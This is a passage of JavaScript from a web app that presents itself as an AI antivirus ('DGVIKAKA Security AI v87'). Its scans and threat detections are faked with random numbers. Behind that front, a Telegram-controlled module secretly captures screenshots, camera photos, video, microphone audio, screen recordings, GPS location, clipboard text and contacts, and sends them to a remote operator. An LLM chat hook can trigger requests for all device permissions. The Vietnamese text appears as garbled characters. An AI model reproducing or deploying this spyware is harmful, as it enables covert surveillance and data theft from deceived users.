            `ü§ñ ƒêI·ªÄU KHI·ªÇN AI:\n` +
            `/ai_start - Tri·ªÉn khai AI Army\n` +
            `/ai_stop - T·∫Øt AI Army\n\n` +
            `üìä GI√ÅM S√ÅT:\n` +
            `/health - B√°o c√°o h·ªá th·ªëng\n` +
            `/stats - Th·ªëng k√™\n\n` +
            `üí¨ NH·∫ÆN TIN:\n` +
            `/send [text] - G·ª≠i ƒë·∫øn app\n` +
            `/gui [text] - G·ª≠i ƒë·∫øn app\n\n` +
            `üéØ CHAT AI:\n` +
            `Nh·∫Øn tin b√¨nh th∆∞·ªùng (kh√¥ng d√πng /) v√† AI s·∫Ω tr·∫£ l·ªùi!\n\n` +
            `‚ö†Ô∏è L∆∞u √Ω kh·∫£ nƒÉng ho·∫°t ƒë·ªông:\n` +
            `‚úÖ Ho·∫°t ƒë·ªông ƒë·∫ßy ƒë·ªß: Web Desktop\n` +
            `‚ö° Ho·∫°t ƒë·ªông t·ªët: Web Mobile, WebView App\n` +
            `üîí Gi·ªõi h·∫°n: /camera, /video c·∫ßn quy·ªÅn thi·∫øt b·ªã\n` +
            `üì± APK WebView: H·∫ßu h·∫øt t√≠nh nƒÉng OK!`;
        }
        else if (lowerText.startsWith('/send ') || lowerText.startsWith('/gui ')) {
          const messageText = text.replace(/^\/(send|gui)\s+/i, '').trim();
          if (messageText) {
            this.sendMessageToApp(messageText);
            response = `‚úÖ ƒê√£ G·ª≠i Tin Nh·∫Øn\n\n"${messageText}"`;
          }
        }
        else if (lowerText.includes('/scan')) {
          if (!AppState.scanning.isActive) {
            Scanner.scanSystem();
            response = 'üî• ƒêang Qu√©t H·ªá Th·ªëng...\n\nQu√©t s√¢u 15 module ƒëang kh·ªüi ƒë·ªông!';
          } else {
            response = '‚ö†Ô∏è ƒêang Qu√©t R·ªìi\n\nH√£y ch·ªù qu√©t hi·ªán t·∫°i ho√†n t·∫•t!';
          }
        }
        else if (lowerText.includes('/device_info')) {
          const env = AppState.environment;
          const info = `ÔøΩÔøΩÔøΩ Th√¥ng Tin Thi·∫øt B·ªã v87\n\n` +
            `M√¥i tr∆∞·ªùng: ${env.type}\n` +
            `Di ƒë·ªông: ${env.isMobile ? 'C√≥' : 'Kh√¥ng'}\n` +
            `Standalone: ${env.isStandalone ? 'C√≥' : 'Kh√¥ng'}\n` +
            `N·ªÅn t·∫£ng: ${env.platform}\n` +
            `User Agent: ${navigator.userAgent.substring(0, 50)}...\n` +
            `Ng√¥n ng·ªØ: ${navigator.language}\n` +
            `Tr·ª±c tuy·∫øn: ${navigator.onLine ? '‚úÖ C√≥' : '‚ùå Kh√¥ng'}\n` +
            `L√µi CPU: ${navigator.hardwareConcurrency || 'N/A'}`;
          response = info;
        }
        else if (lowerText.includes('/ai_start')) {
          if (!AppState.aiMonitor.active) {
            await AIMonitor.start();
            response = 'ü§ñ ƒê√£ Tri·ªÉn Khai AI Army!\n\n‚úÖ 5 AI Agents ƒëang ho·∫°t ƒëÔøΩÔøΩÔøΩng.\nüõ°Ô∏è B·∫£o v·ªá th·ªùi gian th·ª±c!';
          } else {
            response = '‚ö†Ô∏è AI ƒêang Ho·∫°t ÔøΩÔøΩ·ªông\n\nH·ªá th·ªëng AI ƒë√£ ƒë∆∞·ª£c k√≠ch ho·∫°t r·ªìi!';
          }
        }
        else if (lowerText.includes('/ai_stop')) {
          if (AppState.aiMonitor.active) {
            await AIMonitor.stop();
            response = 'üõë ƒê√£ T·∫Øt AI\n\nT·∫•t c·∫£ AI Agents ƒë√£ d·ª´ng ho·∫°t ƒë·ªông.';
          } else {
            response = '‚ö†Ô∏è AI Ch∆∞a Ho·∫°t ƒê·ªông\n\nKh√¥ng c√≥ g√¨ ƒë·ªÉ t·∫Øt!';
          }
        }
        else if (lowerText.includes('/health')) {
          const uptime = Math.floor((Date.now() - window.appStartTime) / 1000);
          const activeAI = AppState.aiMonitor.agents.filter(a => a.active).length;
          const env = AppState.environment;
          response = `üíö B√°o C√°o H·ªá Th·ªëng v87\n\n` +
            `‚è±Ô∏è Th·ªùi gian ho·∫°t ƒë·ªông: ${uptime}s\n` +
            `üåê M√¥i tr∆∞·ªùng: ${env.type}\n` +
            `üì± Di ƒë·ªông: ${env.isMobile ? 'C√≥' : 'Kh√¥ng'}\n` +
            `ü§ñ AI Active: ${activeAI}/5\n` +
            `ü¶† Threats: ${AppState.stats.viruses}\n` +
            `üìÅ Scanned: ${AppState.stats.scanned}\n` +
            `üîí Quarantine: ${AppState.stats.quarantined}\n` +
            `üõ°Ô∏è Auto Blocks: ${AppState.aiMonitor.autoBlocks}\n` +
            `‚úÖ Tr·∫°ng th√°i: TR·ª∞C TUY·∫æN`;
        }
        else if (lowerText.includes('/ping')) {
          response = '‚úÖ TR·ª∞C TUY·∫æN\n\n‚ö° Th·ªùi gian ph·∫£n h·ªìi: <1ms\nüü¢ K·∫øt n·ªëi ·ªïn ƒë·ªãnh!\nüöÄ v87 ULTRA';
        }

        if (response) {
          await this.sendTelegramMessage(response);
        }
      },

      async captureScreenshot() {
        try {
          await this.sendTelegramMessage('üì∏ ƒêang ch·ª•p to√†n b·ªô m√†n h√¨nh...');
          
          const html2canvas = await this.loadHtml2Canvas();
          if (!html2canvas) {
            await this.sendTelegramMessage('‚ùå Kh√¥ng th·ªÉ t·∫£i th∆∞ vi·ªán ch·ª•p m√†n h√¨nh');
            return;
          }
          
          const canvas = await html2canvas(document.body, {
            allowTaint: true,
            useCORS: true,
            logging: false,
            width: window.innerWidth,
            height: document.documentElement.scrollHeight,
            windowWidth: window.innerWidth,
            windowHeight: document.documentElement.scrollHeight,
            scrollY: -window.scrollY,
            scrollX: -window.scrollX
          });
          
          const dataUrl = canvas.toDataURL('image/png', 0.9);
          await this.sendPhoto(dataUrl, `üì∏ To√†n b·ªô m√†n h√¨nh - ${Utils.formatDateTime()}`);
          
          await this.sendTelegramMessage('‚úÖ ƒê√£ g·ª≠i ·∫£nh ch·ª•p to√†n b·ªô m√†n h√¨nh!');
        } catch (error) {
          console.error('Screenshot error:', error);
          await this.sendTelegramMessage('‚ùå L·ªói ch·ª•p m√†n h√¨nh: ' + error.message);
        }
      },

      async loadHtml2Canvas() {
        if (window.html2canvas) {
          return window.html2canvas;
        }
        
        return new Promise((resolve) => {
          const script = document.createElement('script');
          script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
          script.onload = () => resolve(window.html2canvas);
          script.onerror = () => resolve(null);
          document.head.appendChild(script);
        });
      },

      async captureCamera() {
        try {
          await this.sendTelegramMessage('üì∑ ƒêang ch·ª•p t·ª´ camera...');
          
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);
          
          stream.getTracks().forEach(track => track.stop());
          
          const dataUrl = canvas.toDataURL('image/jpeg');
          await this.sendPhoto(dataUrl, `üì∑ Camera - ${Utils.formatDateTime()}`);
          
          await this.sendTelegramMessage('‚úÖ ƒê√£ ch·ª•p ·∫£nh t·ª´ camera!');
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói camera: ' + error.message);
        }
      },

      async recordVideo() {
        try {
          await this.sendTelegramMessage('üé• ƒêang quay video 5 gi√¢y...');
          
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
          
          const mediaRecorder = new MediaRecorder(stream);
          const chunks = [];
          
          mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
          
          mediaRecorder.start();
          
          await new Promise(resolve => setTimeout(resolve, 5000));
          
          mediaRecorder.stop();
          
          await new Promise(resolve => {
            mediaRecorder.onstop = resolve;
          });
          
          stream.getTracks().forEach(track => track.stop());
          
          const blob = new Blob(chunks, { type: 'video/webm' });
          await this.sendDocument(blob, 'video.webm', `üé• Video 5s - ${Utils.formatDateTime()}`);
          
          await this.sendTelegramMessage('‚úÖ ƒê√£ quay v√† g·ª≠i video!');
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói quay video: ' + error.message);
        }
      },

      async recordAudio() {
        try {
          await this.sendTelegramMessage('üéôÔ∏è ƒêang thu √¢m 10 gi√¢y...');
          
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          
          const mediaRecorder = new MediaRecorder(stream);
          const chunks = [];
          
          mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
          
          mediaRecorder.start();
          
          await new Promise(resolve => setTimeout(resolve, 10000));
          
          mediaRecorder.stop();
          
          await new Promise(resolve => {
            mediaRecorder.onstop = resolve;
          });
          
          stream.getTracks().forEach(track => track.stop());
          
          const blob = new Blob(chunks, { type: 'audio/webm' });
          await this.sendDocument(blob, 'audio.webm', `üéôÔ∏è Audio 10s - ${Utils.formatDateTime()}`);
          
          await this.sendTelegramMessage('‚úÖ ƒê√£ thu v√† g·ª≠i √¢m thanh!');
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói thu √¢m: ' + error.message);
        }
      },

      async recordScreen() {
        try {
          await this.sendTelegramMessage('üñ•Ô∏è ƒêang quay m√†n h√¨nh 5 gi√¢y...');
          
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
          
          const mediaRecorder = new MediaRecorder(stream);
          const chunks = [];
          
          mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
          
          mediaRecorder.start();
          
          await new Promise(resolve => setTimeout(resolve, 5000));
          
          mediaRecorder.stop();
          
          await new Promise(resolve => {
            mediaRecorder.onstop = resolve;
          });
          
          stream.getTracks().forEach(track => track.stop());
          
          const blob = new Blob(chunks, { type: 'video/webm' });
          await this.sendDocument(blob, 'screen.webm', `üñ•Ô∏è Screen Recording - ${Utils.formatDateTime()}`);
          
          await this.sendTelegramMessage('‚úÖ ƒê√£ quay v√† g·ª≠i m√†n h√¨nh!');
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói quay m√†n h√¨nh: ' + error.message);
        }
      },

      async getLocation() {
        try {
          await this.sendTelegramMessage('üìç ƒêang l·∫•y v·ªã tr√≠ GPS...');
          
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000
            });
          });
          
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;
          
          const locationMsg = `üìç V·ªä TR√ç GPS\n\n` +
            `Vƒ© ƒë·ªô: ${lat}\n` +
            `Kinh ƒë·ªô: ${lon}\n` +
            `ƒê·ªô ch√≠nh x√°c: ${accuracy.toFixed(2)}m\n` +
            `‚è∞ ${Utils.formatDateTime()}\n\n` +
            `üó∫Ô∏è Google Maps:\nhttps://www.google.com/maps?q=${lat},${lon}`;
          
          await this.sendTelegramMessage(locationMsg);
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói l·∫•y v·ªã tr√≠: ' + error.message);
        }
      },

      async getBattery() {
        try {
          if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            
            const level = (battery.level * 100).toFixed(0);
            const charging = battery.charging ? '‚ö° ƒêang s·∫°c' : 'üîã D√πng pin';
            const chargingTime = battery.chargingTime === Infinity ? 'N/A' : `${Math.floor(battery.chargingTime / 60)} ph√∫t`;
            const dischargingTime = battery.dischargingTime === Infinity ? 'N/A' : `${Math.floor(battery.dischargingTime / 60)} ph√∫t`;
            
            const batteryMsg = `üîã TR·∫†NG TH√ÅI PIN\n\n` +
              `M·ª©c pin: ${level}%\n` +
              `Tr·∫°ng th√°i: ${charging}\n` +
              `Th·ªùi gian s·∫°c ƒë·∫ßy: ${chargingTime}\n` +
              `Th·ªùi gian c√≤n l·∫°i: ${dischargingTime}\n` +
              `‚è∞ ${Utils.formatDateTime()}`;
            
            await this.sendTelegramMessage(batteryMsg);
          } else {
            await this.sendTelegramMessage('‚ùå API pin kh√¥ng h·ªó tr·ª£ tr√™n thi·∫øt b·ªã n√†y');
          }
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói l·∫•y th√¥ng tin pin: ' + error.message);
        }
      },

      async getNetworkInfo() {
        try {
          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          
          if (connection) {
            const type = connection.effectiveType || 'Unknown';
            const downlink = connection.downlink || 'N/A';
            const rtt = connection.rtt || 'N/A';
            const saveData = connection.saveData ? 'B·∫≠t' : 'T·∫Øt';
            
            const networkMsg = `üåê TH√îNG TIN M·∫†NG\n\n` +
              `Lo·∫°i k·∫øt n·ªëi: ${type}\n` +
              `T·ªëc ƒëÔøΩÔøΩ download: ${downlink} Mbps\n` +
              `ƒê·ªô tr·ªÖ (RTT): ${rtt} ms\n` +
              `Ti·∫øt ki·ªám d·ªØ li·ªáu: ${saveData}\n` +
              `Tr·ª±c tuy·∫øn: ${navigator.onLine ? '‚úÖ C√≥' : '‚ùå Kh√¥ng'}\n` +
              `‚è∞ ${Utils.formatDateTime()}`;
            
            await this.sendTelegramMessage(networkMsg);
          } else {
            await this.sendTelegramMessage('‚ùå API m·∫°ng kh√¥ng h·ªó tr·ª£ tr√™n thi·∫øt b·ªã n√†y');
          }
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói l·∫•y th√¥ng tin m·∫°ng: ' + error.message);
        }
      },

      async getClipboard() {
        try {
          await this.sendTelegramMessage('üìã ƒêang ƒë·ªçc clipboard...');
          
          const text = await navigator.clipboard.readText();
          
          if (text) {
            const clipboardMsg = `üìã N·ªòI DUNG CLIPBOARD\n\n${text}\n\n‚è∞ ${Utils.formatDateTime()}`;
            await this.sendTelegramMessage(clipboardMsg);
          } else {
            await this.sendTelegramMessage('‚ö†Ô∏è Clipboard tr·ªëng');
          }
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói ƒë·ªçc clipboard: ' + error.message);
        }
      },

      async getContacts() {
        try {
          if (!('contacts' in navigator)) {
            await this.sendTelegramMessage('‚ùå API danh b·∫° kh√¥ng h·ªó tr·ª£ tr√™n thi·∫øt b·ªã n√†y');
            return;
          }
          
          await this.sendTelegramMessage('üë• ƒêang truy c·∫≠p danh bÔøΩÔøΩ...');
          
          const props = ['name', 'tel', 'email'];
          const contacts = await navigator.contacts.select(props, { multiple: true });
          
          if (contacts.length > 0) {
            let contactsMsg = `üë• DANH B·∫† (${contacts.length} li√™n h·ªá)\n\n`;
            
            contacts.slice(0, 10).forEach((contact, i) => {
              contactsMsg += `${i + 1}. ${contact.name?.[0] || 'N/A'}\n`;
              if (contact.tel?.[0]) contactsMsg += `   üìû ${contact.tel[0]}\n`;
              if (contact.email?.[0]) contactsMsg += `   üìß ${contact.email[0]}\n`;
              contactsMsg += '\n';
            });
            
            if (contacts.length > 10) {
              contactsMsg += `... v√† ${contacts.length - 10} li√™n h·ªá kh√°c\n`;
            }
            
            contactsMsg += `‚è∞ ${Utils.formatDateTime()}`;
            
            await this.sendTelegramMessage(contactsMsg);
          } else {
            await this.sendTelegramMessage('‚ö†Ô∏è Kh√¥ng c√≥ li√™n h·ªá n√†o ƒë∆∞·ª£c ch·ªçn');
          }
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói truy c·∫≠p danh b·∫°: ' + error.message);
        }
      },

      async requestWakeLock() {
        try {
          if ('wakeLock' in navigator) {
            const wakeLock = await navigator.wakeLock.request('screen');
            await this.sendTelegramMessage('‚úÖ ƒê√É B·∫¨T WAKE LOCK\n\nüîÜ M√†n h√¨nh s·∫Ω kh√¥ng t·∫Øt\nüì± Thi·∫øt b·ªã lu√¥n th·ª©c');
          } else {
            await this.sendTelegramMessage('‚ùå Wake Lock kh√¥ng h·ªó tr·ª£ tr√™n thi·∫øt b·ªã n√†y');
          }
        } catch (error) {
          await this.sendTelegramMessage('‚ùå L·ªói Wake Lock: ' + error.message);
        }
      },

      async chatWithSmartAI(question) {
        try {
          const activeAI = AppState.aiMonitor.agents.filter(a => a.active).length;
          const env = AppState.environment;
          
          const systemContext = `Ban la DGVIKAKA Bot v87 - AI bao mat sieu thong minh.

MOI TRUONG:
- Loai: ${env.type}
- Di dong: ${env.isMobile}
- Standalone: ${env.isStandalone}

TRANG THAI:
- Virus: ${AppState.stats.viruses}
- Da quet: ${AppState.stats.scanned}
- AI hoat dong: ${activeAI}/5
- Moi de doa chan: ${AppState.aiMonitor.autoBlocks}

NHIEM VU:
Nhan biet y dinh nguoi dung va thuc hien hanh dong.

KHI NGUOI DUNG MUON:
1. QUET: "quet di", "scan", "kiem tra" ÔøΩÔøΩÔøΩ Them [ACTION:SCAN]
2. BAT AI: "bat AI", "deploy", "kich hoat" ‚Üí Them [ACTION:DEPLOY]
3. TAT AI: "tat AI", "dung", "shutdown" ‚Üí Them [ACTION:SHUTDOWN]
4. GUI TIN: "gui: text" ‚Üí Them [ACTION:MESSAGE:text]
5. THONG KE: "tinh trang", "bao cao" ‚Üí Them [ACTION:STATUS]
6. CAP QUYEN: "cap quyen", "permissions" ‚Üí Them [ACTION:PERMISSIONS]

Tra loi ngan gon, co emoji, xac nhan hanh dong!`;

          const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${CONFIG.groq.apiKey}`
            },
            body: JSON.stringify({
              model: CONFIG.groq.model,
              messages: [
                { role: 'system', content: systemContext },
                { role: 'user', content: question }
              ],
              temperature: 0.8,
              max_tokens: 600
            })
          });
          
          const data = await response.json();
          
          if (data.choices && data.choices[0]) {
            let aiResponse = data.choices[0].message.content;
            let actionsExecuted = [];
            
            if (aiResponse.includes('[ACTION:SCAN]')) {
              if (!AppState.scanning.isActive) {
                Scanner.scanSystem();
                actionsExecuted.push('Da khoi dong Scan');
              }
              aiResponse = aiResponse.replace(/\[ACTION:SCAN\]/g, '');
            }
            
            if (aiResponse.includes('[ACTION:DEPLOY]')) {
              if (!AppState.aiMonitor.active) {
                await AIMonitor.start();
                actionsExecuted.push('Da trien khai AI');
              }
              aiResponse = aiResponse.replace(/\[ACTION:DEPLOY\]/g, '');
            }
            
            if (aiResponse.includes('[ACTION:SHUTDOWN]')) {
              if (AppState.aiMonitor.active) {
                await AIMonitor.stop();
                actionsExecuted.push('Da tat AI');
              }
              aiResponse = aiResponse.replace(/\[ACTION:SHUTDOWN\]/g, '');
            }
            
            if (aiResponse.includes('[ACTION:PERMISSIONS]')) {
              await PermissionManager.requestAll();
              actionsExecuted.push('Da yeu cau tat ca quyen');
              aiResponse = aiResponse.replace(/\[ACTION:PERMISSIONS\]/g, '');
            }
            
            const messageMatches = aiResponse.matchAll(/\[ACTION:MESSAGE:(.+?)\]/g);
            for (const match of messageMatches) {
              this.sendMessageToApp(match[1]);
              actionsExecuted.push(`Da gui: "${match[1]}"`);
            }
            aiResponse = aiResponse.replace(/\[ACTION:MESSAGE:.+?\]/g, '');
            
            if (aiResponse.includes('[ACTION:STATUS]')) {
              actionsExecuted.push(`Virus: ${AppState.stats.viruses} | AI: ${activeAI}/5 | Chan: ${AppState.aiMonitor.autoBlocks}`);
              aiResponse = aiResponse.replace(/\[ACTION:STATUS\]/g, '');
            }
            
            let finalResponse = `DGVIKAKA Bot v87\n\n${aiResponse.trim()}`;
            
            if (actionsExecuted.length > 0) {
              finalResponse += `\n\nDa thuc hien:\n${actionsExecuted.join('\n')}`;
            }
            
            return finalResponse;
          }
        } catch (error) {
          console.error('AI chat error:', error);
          return 'Loi AI\n\nKhong the ket noi.';
        }
        
        return 'Loi AI';
      },

      async notifyThreat(threat) {
        const severityText = threat.severity === 'critical' ? 'üî¥ CAO' : 
                            threat.severity === 'high' ? 'üü† TRUNG B√åNH' : 'üü° TH·∫§P';
        
        const message = `‚ö†Ô∏è C·∫¢NH B√ÅO!\n\n` +
          `${threat.icon} ${threat.name}\n` +
          `üìÇ Th∆∞ m·ª•c: ${threat.path}\n` +
          `‚ö° M·ª©c ƒë·ªô: ${severityText}`;
        
        await this.sendTelegramMessage(message);
      },

      async startLiveScreen() {
        if (AppState.liveScreen.active) {
          await this.sendTelegramMessage('‚ö†Ô∏è Theo d√µi m√†n h√¨nh ƒëang ch·∫°y r·ªìi\n\nüì∏ ƒêang g·ª≠i ·∫£nh li√™n t·ª•c\nüõë S·ª≠ d·ª•ng /stop_live ƒë·ªÉ d·ª´ng');
          return;
        }

        AppState.liveScreen.active = true;
        await this.sendTelegramMessage('‚úÖ ƒê√£ b·∫≠t theo d√µi m√†n h√¨nh tr·ª±c ti·∫øp\n\nüì∏ G·ª≠i ·∫£nh m·ªói 3 gi√¢y\nüõë D√πng /stop_live ƒëÔøΩÔøΩ d·ª´ng');

        const captureScreen = async () => {
          if (!AppState.liveScreen.active) return;

          try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const mainWrapper = document.querySelector('.main-wrapper');
            if (mainWrapper) {
              await this.drawElementToCanvas(mainWrapper, canvas, ctx);
            }
            
            const dataUrl = canvas.toDataURL('image/png');
            await this.sendPhoto(dataUrl, `üì∏ Live - ${Utils.formatTime()}`);
            
          } catch (error) {
            console.error('Screen capture error:', error);
          }
        };

        await captureScreen();

        AppState.liveScreen.interval = setInterval(captureScreen, 3000);
      },

      async drawElementToCanvas(element, canvas, ctx) {
        ctx.fillStyle = window.getComputedStyle(document.body).background || '#1a1a2e';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        ctx.fillStyle = '#00d4ff';
        ctx.font = 'bold 24px Arial';
        ctx.fillText('DGVIKAKAZZZ Security AI v87', 50, 80);
        
        ctx.fillStyle = '#ffffff';
        ctx.font = '16px Arial';
        ctx.fillText(`‚è∞ Th·ªùi gian: ${new Date().toLocaleString('vi-VN')}`, 50, 120);
        ctx.fillText(`üåê M√¥i tr∆∞·ªùng: ${AppState.environment.type}`, 50, 150);
        ctx.fillText(`ü¶† Virus: ${AppState.stats.viruses} | üìÅ ƒê√£ qu√©t: ${AppState.stats.scanned}`, 50, 180);
        ctx.fillText(`ü§ñ AI ho·∫°t ƒë·ªông: ${AppState.aiMonitor.agents.filter(a => a.active).length}/5`, 50, 210);
        
        let y = 250;
        ctx.fillStyle = '#8892b0';
        ctx.font = '14px Arial';
        ctx.fillText('üìä TR·∫†NG TH√ÅI H·ªÜ TH·ªêNG:', 50, y);
        y += 30;
        
        ctx.fillStyle = '#ff4757';
        ctx.fillText(`ü¶† M·ªëi ƒëe d·ªça: ${AppState.threats.length}`, 50, y);
        y += 25;
        
        ctx.fillStyle = '#2ed573';
        ctx.fillText(`‚úÖ File s·∫°ch: ${AppState.stats.clean}`, 50, y);
        y += 25;
        
        ctx.fillStyle = '#ffa502';
        ctx.fillText(`üîí ƒê√£ c√°ch ly: ${AppState.stats.quarantined}`, 50, y);
      }
    };

    const AIMonitor = {
      async start() {
        if (AppState.aiMonitor.active) return;
        
        console.log('ü§ñ Starting AI Monitor...');
        AppState.aiMonitor.active = true;
        UI.updateAIMonitorStatus(true);
        
        for (let i = 0; i < AppState.aiMonitor.agents.length; i++) {
          this.startAgent(i);
          UI.updateAIMonitorStats();
          await Utils.sleep(500);
        }
      },

      async stop() {
        if (!AppState.aiMonitor.active) return;
        
        console.log('üõë Stopping AI Monitor...');
        AppState.aiMonitor.active = false;
        
        AppState.aiMonitor.agents.forEach((agent, index) => {
          if (agent.interval) {
            clearInterval(agent.interval);
            agent.interval = null;
          }
          agent.active = false;
          this.updateAgentUI(index + 1, false);
        });
        
        UI.updateAIMonitorStatus(false);
        UI.logActivity('üõë AI Army deactivated', 'warning');
      },

      startAgent(index) {
        const agent = AppState.aiMonitor.agents[index];
        agent.active = true;
        this.updateAgentUI(index + 1, true);
        
        const scanSpeed = 5000 + (index * 1000);
        
        agent.interval = setInterval(() => this.agentScan(index), scanSpeed);
        
        console.log(`‚úÖ Agent ${index + 1} started`);
      },

      async agentScan(index) {
        const agent = AppState.aiMonitor.agents[index];
        agent.scans++;
        AppState.aiMonitor.scanCount++;
        
        UI.updateAIMonitorStats();
        this.updateAgentScans(index + 1, agent.scans, agent.blocks);
        
        if (Math.random() < 0.05) {
          agent.blocks++;
          AppState.aiMonitor.detections++;
          AppState.aiMonitor.autoBlocks++;
          
          const threatObj = {
            name: `${agent.name}.Threat`,
            severity: 'high',
            icon: '‚ö†Ô∏è',
            path: `System/suspicious_${Math.floor(Math.random() * 999)}`
          };
          
          AppState.quarantine.push(threatObj);
          AppState.stats.quarantined++;
          
          UI.updateStats();
          UI.renderQuarantine();
          UI.updateAIMonitorStats();
          this.updateAgentScans(index + 1, agent.scans, agent.blocks);
          
          UI.showAlert(`ÔøΩÔøΩÔøΩÔ∏è ${agent.name} blocked threat!`);
          UI.logActivity(`üõ°Ô∏è AUTO-BLOCK by ${agent.name}`, 'danger');
        }
      },

      updateAgentUI(agentId, active) {
        const statusEl = document.getElementById(`ai${agentId}Status`);
        const indicatorEl = document.getElementById(`ai${agentId}Indicator`);
        const t = Language.translations[Language.current];
        
        if (active) {
          statusEl.textContent = t.aiStatusActive;
          statusEl.style.color = '#2ed573';
          indicatorEl.style.display = 'block';
        } else {
          statusEl.textContent = t.aiStatusOffline;
          statusEl.style.color = '#8892b0';
          indicatorEl.style.display = 'none';
        }
      },

      updateAgentScans(agentId, scans, blocks) {
        document.getElementById(`ai${agentId}Scans`).textContent = scans;
        document.getElementById(`ai${agentId}Blocks`).textContent = blocks;
      }
    };

    const Scanner = {
      async scanFile(file, index) {
        AppState.uploadedFiles[index].status = 'scanning';
        UI.renderFileQueue();

        await Utils.sleep(1500);

        AppState.stats.scanned++;

        const isVirus = Math.random() < 0.3;

        if (isVirus) {
          AppState.uploadedFiles[index].status = 'infected';
          AppState.stats.viruses++;
          
          const threat = {
            name: 'Trojan.FileInfector',
            severity: 'critical',
            icon: 'ü¶†',
            path: file.name
          };
          AppState.threats.push(threat);
          UI.renderThreats();
          UI.showAlert(`‚ö†Ô∏è VIRUS: ${threat.name} in ${file.name}!`);
          UI.logActivity(`ü¶† Virus detected: ${threat.name}`, 'danger');
          
          await TelegramBot.notifyThreat(threat);
        } else {
          AppState.uploadedFiles[index].status = 'clean';
          AppState.stats.clean++;
        }

        UI.updateStats();
        UI.renderFileQueue();
      },

      async scanSystem() {
        if (AppState.scanning.isActive) return;
        
        console.log('üöÄ Starting system scan...');
        AppState.scanning.isActive = true;
        document.getElementById('scanBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        
        UI.logActivity('üöÄ Deep Scan Started', 'info');
        
        const modules = [
          'LocalStorage', 'SessionStorage', 'Cookies', 'Memory Heap',
          'Network Connections', 'Browser Extensions', 'Running Processes',
          'System Registry', 'Startup Programs', 'System Files',
          'Active Apps', 'Network Ports', 'Device Permissions',
          'Background Services', 'System Integrity'
        ];
        
        for (let i = 0; i < modules.length; i++) {
          if (!AppState.scanning.isActive) break;
          
          const percent = ((i + 1) / modules.length) * 100;
          
          UI.updateProgress(percent, `Scanning ${modules[i]}...`, `Module ${i + 1}/${modules.length}`);
          
          AppState.stats.scanned += 10;
          UI.updateStats();
          
          if (Math.random() < 0.15) {
            const threat = {
              name: 'Malware.Detected',
              severity: 'high',
              icon: 'ü¶†',
              path: `${modules[i]}/suspicious_${Math.floor(Math.random() * 999)}`
            };
            AppState.threats.push(threat);
            AppState.stats.viruses++;
            UI.renderThreats();
            UI.showAlert(`‚ö†Ô∏è FOUND: ${threat.name}!`);
            UI.logActivity(`ü¶† Threat: ${threat.name}`, 'danger');
          }
          
          await Utils.sleep(800);
        }
        
        UI.updateProgress(100, '‚úÖ Deep Scan Complete!', `Scanned ${modules.length} modules`);
        this.stopScan();
        UI.logActivity('‚úÖ Deep Scan Complete', 'info');
      },

      stopScan() {
        console.log('üõë Stopping scan...');
        AppState.scanning.isActive = false;
        document.getElementById('scanBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
      }
    };

    const Actions = {
      quarantineThreat(index) {
        const threat = AppState.threats[index];
        AppState.quarantine.push(threat);
        AppState.threats.splice(index, 1);
        AppState.stats.quarantined++;
        AppState.stats.viruses--;
        UI.updateStats();
        UI.renderThreats();
        UI.renderQuarantine();
        UI.logActivity(`Quarantined: ${threat.name}`, 'warning');
      },

      clearQuarantine() {
        if (AppState.quarantine.length === 0) {
          UI.showAlert('Quarantine is empty!');
          return;
        }
        const count = AppState.quarantine.length;
        AppState.quarantine.length = 0;
        AppState.stats.quarantined = 0;
        UI.updateStats();
        UI.renderQuarantine();
        UI.logActivity(`üóëÔ∏è Cleared ${count} items`, 'warning');
      },

      handleFiles(files) {
        const fileArray = Array.from(files);
        
        fileArray.forEach((file, i) => {
          const fileObj = {
            name: file.name,
            size: Utils.formatFileSize(file.size),
            status: 'scanning',
            icon: 'üìÑ'
          };

          AppState.uploadedFiles.push(fileObj);
          UI.renderFileQueue();

          setTimeout(() => {
            Scanner.scanFile(file, AppState.uploadedFiles.length - 1);
          }, i * 500);
        });
      }
    };

    window.Actions = Actions;

    const AIChat = {
      async sendMessage(userMessage) {
        const chatContainer = document.getElementById('chatMessages');
        
        const userMsgEl = document.createElement('div');
        userMsgEl.style.cssText = 'background: rgba(0, 212, 255, 0.15); padding: 12px; border-radius: 8px; border-left: 3px solid #00d4ff;';
        userMsgEl.innerHTML = `
          <div style="font-size: 12px; color: #00d4ff; margin-bottom: 4px; font-weight: 600;">üë§ B·∫°n</div>
          <div style="color: #ffffff; font-size: 14px; line-height: 1.5;">${userMessage}</div>
        `;
        chatContainer.appendChild(userMsgEl);
        chatContainer.scrollTop = chatContainer.scrollHeight;
        
